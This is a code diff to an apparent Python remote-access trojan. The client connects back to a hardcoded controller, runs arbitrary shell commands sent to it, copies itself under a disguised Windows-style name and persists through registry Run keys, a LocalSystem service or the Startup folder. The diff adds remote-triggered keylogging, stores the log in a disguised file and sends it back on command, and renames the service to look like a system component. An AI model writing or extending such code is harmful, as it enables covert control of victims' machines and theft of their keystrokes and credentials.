@@ -10,10 +10,14 @@ import shutil
 import time
 import requests
 from mss import mss
+import threading
+import keylogger
+
 
 HOST = '192.168.0.94'
 PORT = 54321
 pers_loc = os.environ['appdata'] + '\\Microsoft\\Windows\\System32\\windows32.exe'
+keylogger_path = os.environ['appdata'] + '\\processmanager.bin'
 persist_run = False     # Implements persistence through RUN registry key - User Permissions
 persist_srv = True      # Implements persistence through Services registry key - NT Authority/System permissions
 persist_stu = False      # Implements persistence through Start Up user folder - User permissions
@@ -89,6 +93,7 @@ def connection(_s):
 
 
 def shell(_s):
+    global keylogger_path
     while True:
         cmd = reliable_recv(_s)
         if cmd == 'q':
@@ -96,7 +101,6 @@ def shell(_s):
             # print(colored('[-] Instruction to close sent from the server', 'red'))
             _s.close()
             sys.exit(0)
-            break
         elif cmd[:5] == 'help':
             reliable_send(_s, get_help())
         elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
@@ -148,6 +152,12 @@ def shell(_s):
                     reliable_send(_s, '[!] The user does NOT has Admin priviledges!')
             except:
                 reliable_send(_s, 'Can`t perform the check')
+        elif cmd[:12] == 'keylog_start':
+            tl = threading.Thread(target=keylogger.start)
+            tl.start()
+        elif cmd[:11] == 'keylog_dump':
+            fn = open(keylogger_path, "r")
+            reliable_send(_s, fn.read())
         else:
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -185,20 +195,20 @@ def persistence_service(_pers_loc):
     if not os.path.exists(_pers_loc):
         create_dir(_pers_loc)
         shutil.copyfile(sys.executable, _pers_loc)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v ImagePath /t REG_EXPAND_SZ /d "' + _pers_loc + '"', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v Type /t REG_DWORD /d 16', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v Start /t REG_DWORD /d 2', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v ErrorControl /t REG_DWORD /d 0', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v DisplayName /t REG_SZ /d "' + _pers_loc.split('\\')[-1] + '"', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v DependOnService /t REG_MULTI_SZ /d Tcpip', shell=True)
-        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Service '
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
                         '/v ObjectName /t REG_SZ /d LocalSystem', shell=True)
 
 
